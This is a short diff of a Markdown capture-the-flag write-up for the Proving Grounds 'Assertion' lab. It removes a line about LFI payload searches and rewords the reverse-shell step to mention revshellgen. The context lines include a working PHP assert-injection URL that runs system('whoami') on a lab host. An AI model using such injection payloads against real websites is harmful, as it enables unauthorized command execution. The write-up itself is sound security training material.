@@ -46,8 +46,6 @@ The URL looks susceptible to LFI, but we get a custom message after a simple tes
 
 ![brother](../../../assets/images/ctfs/proving_grounds/assertion/brother.png)
 
-Looking online for LFI payload alternatives, I found this writeup:
-
 # Exploitation
 
 ---
@@ -62,7 +60,7 @@ http://192.168.232.94/index.php?page=%27%20and%20die(system(%22whoami%22))%20or%
 
 ![whoami](../../../assets/images/ctfs/proving_grounds/assertion/whoami.png)
 
-Generate a reverse shell with a
+Generate a reverse shell with revshellgen
 
 ```bash
 ┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
